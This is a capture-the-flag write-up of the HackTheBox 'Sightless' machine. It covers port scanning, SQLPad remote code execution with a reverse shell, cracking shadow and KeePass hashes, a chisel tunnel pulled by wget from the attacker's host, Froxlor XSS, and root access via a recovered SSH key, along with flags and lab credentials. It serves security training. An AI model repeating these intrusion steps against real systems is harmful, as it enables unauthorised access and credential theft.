---
layout: post
title: Sightless - Easy - Linux
date: 07-09-2024
categories: [CTF - HackTheBox]
tag: [ftp, SQLPad, xss, KeePass]
---

# Nmap Scan

Port scan discovered an Apache web service running on the default port 80 and SSH on 22.

```
# Nmap 7.94SVN scan initiated Sat Sep  7 23:05:02 2024 as: nmap -sCV -p- -v -oN portscan.log 10.10.11.32
Nmap scan report for 10.10.11.32
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/7%Time=66DD1476%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S
SF:erver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20t
SF:ry\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x2
SF:0being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  7 23:06:22 2024 -- 1 IP address (1 host up) scanned in 80.90 seconds

```

# Inspecting FTP

```
┌──(kali㉿kali)-[~/hackthebox/sightless]
└─$ ftp 10.10.11.32
Connected to 10.10.11.32.

220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
Name (10.10.11.32:kali): 550 SSL/TLS required on the control channel
ftp: Login failed
ftp> 
```

```
┌──(kali㉿kali)-[~/hackthebox/sightless]
└─$ sftp 10.10.11.32       
The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:40: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
kali@10.10.11.32's password: 
anonymous@10.10.11.32's password: 
Permission denied, please try again.
anonymous@10.10.11.32's password: 
Permission denied, please try again.
anonymous@10.10.11.32's password: 
```

# Inspecting Port 80 (sightless.htb)

![376880716b119d0820e4ab2ee91527ab.png](/assets/img/376880716b119d0820e4ab2ee91527ab.png)

# Inspecting SQLPad (sqlpad.sightless.htb)

![7cfe7dc72aa8f6f8b0257a8f182565bd.png](/assets/img/7cfe7dc72aa8f6f8b0257a8f182565bd.png)

# SQLPad - RCE

Source: https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb

### Payload 

![c0baa4c7b2f8cbd196879f6a3f59b1a5.png](/assets/img/c0baa4c7b2f8cbd196879f6a3f59b1a5.png)

### Payload - Screenshot

![bde8734a4dab0e409daeb32a8d144469.png](/assets/img/bde8734a4dab0e409daeb32a8d144469.png)

### Python Server

```
10.10.11.32 - - [08/Sep/2024 15:01:06] "GET /revshell HTTP/1.1" 200 -
```

### Reverse Shell Returned

```
┌──(kali㉿kali)-[~/hackthebox/sightless]
└─$ nc -lvnp 9001      
listening on [any] 9001 ...
 qconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.32] 38422
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad#
```

# Inspecting Docker Container

### /etc/shadow

```
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
```

### Cracked Hashes

```
michael:insaneclownposse:19860:0:99999:7:::
root:blindside:19858:0:99999:7:::
```

# SSH Access - michael

```
┌──(kali㉿kali)-[~/hackthebox/sightless]
└─$ ssh michael@sightless.htb 
michael@sightless.htb's password: 
Last login: Sun Sep  8 18:51:41 2024 from 10.10.16.6
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
michael@sightless:~$ cat user.txt
94d5fa572ad1d8bce796590c5fce9978
michael@sightless:~$ 
```

# Inspecting Port 8080

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -  
```

# Creating Tunnel

```
michael@sightless:/tmp$ wget 10.10.14.2/chisel
--2024-09-08 19:19:12--  http://10.10.14.2/chisel
Connecting to 10.10.14.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 (8.3M) [application/octet-stream]
Saving to: ‘chisel’

chisel                  100%[===============================>]   8.25M  2.85MB/s    in 2.9s    

2024-09-08 19:19:15 (2.85 MB/s) - ‘chisel’ saved [8654848/8654848]

michael@sightless:/tmp$ chmod +x chisel 
michael@sightless:/tmp$ ./chisel client 10.10.14.2:9002 R:8081:127.0.0.1:8080 &
[1] 45394
michael@sightless:/tmp$ 2024/09/08 19:20:06 client: Connecting to ws://10.10.14.2:9002
2024/09/08 19:20:06 client: Connected (Latency 30.835842ms)

michael@sightless:/tmp$ 
```

# Accessing via Firefox

![0e044bc18e1772aad013fef4381e94c4.png](/assets/img/0e044bc18e1772aad013fef4381e94c4.png)

# Inspecting Apache Configuration

```
michael@sightless:/etc/apache2/sites-enabled$ cat 000-default.conf
<VirtualHost 127.0.0.1:8080>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

```

# Updating Hosts File

```
└─$ cat /etc/hosts       
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.10.11.32 sightless.htb sqlpad.sightless.htb
127.0.0.1 admin.sightless.htb
```

# Accessing via Firefox 

![a3a33f5a0207b291cd6c5831dcb2d206.png](/assets/img/a3a33f5a0207b291cd6c5831dcb2d206.png)

# Blind XXS 

Source: https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53


### Testing Credentials 

```
abcd:Abcd@@1234
```

### Logged in as Admin

![aedbac53db9bc9de658b15fdbbc5a5d8.png](/assets/img/aedbac53db9bc9de658b15fdbbc5a5d8.png)

# Updating FTP Password

![37a1cc26c96cf043565f4baa739075f8.png](/assets/img/37a1cc26c96cf043565f4baa739075f8.png)

# Inspecting FTP

```python
from ftplib import FTP_TLS
import os

ftp_server = '127.0.0.1'
ftp_user = 'web1'
ftp_pass = 'mtfWyUpqxn'

def download_ftp_directory(ftps, remote_dir, local_dir):
    os.makedirs(local_dir, exist_ok=True)
    ftps.cwd(remote_dir)
    file_list = ftps.nlst()

    for file_name in file_list:
        local_path = os.path.join(local_dir, file_name)
        if is_ftp_directory(ftps, file_name):
            download_ftp_directory(ftps, file_name, local_path)
        else:
            with open(local_path, 'wb') as local_file:
                ftps.retrbinary(f'RETR {file_name}', local_file.write)
            print(f"Downloaded: {local_path}")

    ftps.cwd('..')

def is_ftp_directory(ftps, name):
    current = ftps.pwd()
    try:
        ftps.cwd(name)
        ftps.cwd(current)
        return True
    except Exception:
        return False

ftps = FTP_TLS()

try:
    ftps.connect(ftp_server, 21)
    ftps.login(user=ftp_user, passwd=ftp_pass)
    ftps.prot_p()

    print("Current directory:", ftps.pwd())
    download_ftp_directory(ftps, '.', os.getcwd())

except Exception as e:
    print(f"An error occurred: {e}")
finally:
    ftps.quit()
    print("Connection closed.")

```

### Output of Script

```
michael@sightless:/tmp/vmware$ python3 ftpscript.py 
Current directory: /
Downloaded: /tmp/vmware/index.html
Downloaded: /tmp/vmware/goaccess/backup/Database.kdb
Connection closed.
michael@sightless:/tmp/vmware$ 
```

# Inspecting Keepass2 Vault

```
┌──(kali㉿kali)-[~/hackthebox/sightless]
└─$ keepass2john keydb                                        
Inlining keydb
keydb:$keepass$*1*600000*0*6a92df8eddaee09f5738d10aadeec391*29b2b65a0a6186a62814d75c0f9531698bb5b42312e9cf837e3ceeade7b89e85*f546cac81b88893d598079d95def2be5*9083771b911d42b1b9192265d07285e590f3c2f224c9aa792fc57967d04e2a70*1*5168*14bee18518f4491ef53856b181413055e4d26286ba94ef50ad18a46b99571dea3bfab3faba16550a7e2191179a16a0e38b806bb128c78d98ae0a50a7fafea327a2a247f22f2d8c78dfae6400c9e29e25204d65f9482608cfc4e48a8f5edfd96419ac45345c73aa7fb3229de849396b393a71a85e91cf5ac459f3e447ee894f8f3cf2d982dfb023183c852805fbcc9959d4e628ab3655d2df1feb4ceff80f0782b28ff893e7dfd3b5fa42e2c4dad79544e55931e62b1b6ec678b800db1ddf3f9176f6eab55724c38f49642608df2fdf300ff13d2e6391c45e321ef5b8223d722585f3bb1dcce3b560c4e8a73a51e57a8a151f426219ecd692111f902756a2295045f0425f998dba7ea54cdf615f55ee1065daec8345ca17a4c1c73bd60efebf7e8aab724bb897686145ea0eaf02495702da93365627f8cad3595beb88ca1de110235262133c1f2e24fc

*** SNIP ***

808df406ebc701c4e3d5892fa5ad1452cc12bf87d79b386a4c55d48bddb0c5db39617d216025c874c08952a97c01fadfe6d65c0a54b9ddaa2b53e928ea11f2831884
```

```
┌──(kali㉿kali)-[~/hackthebox/sightless]
└─$ john keydb.hash --show                                     
keydb:bulldogs
```

# Keepass2 Vault - Root ID_RSA

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAvTD30GGuaP9aLJaeV9Na4xQ3UBzYis5OhC6FzdQN0jxEUdl6V31q
lXlLFVw4Z54A5VeyQ928EeForZMq1FQeFza+doOuGWIId9QjyMTYn7p+1yVilp56jOm4DK
4ZKZbpayoA+jy5bHuHINgh7AkxSeNQIRvKznZAt4b7+ToukN5mIj6w/FQ7hgjQarpuYrox

*** SNIP ***

ojHlAvysf4a4xuX72CXMyRfVGXTtK3L18SZksdrg0CAKgxnMGWNkgD6I/M+EwSJQmgsLPK
tLfOAdSsE7MAAAASam9obkBzaWdodGxlc3MuaHRiAQ==
-----END OPENSSH PRIVATE KEY-----
```

# SSH Access - root

```
┌──(kali㉿kali)-[~/hackthebox/sightless]
└─$ ssh root@sightless.htb -i id_rsa           
Last login: Tue Sep  3 08:18:45 2024
root@sightless:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sightless:~# cat /root/root.txt
0fd48be140b82688ad61a2ae64bbec3d
root@sightless:~# 
```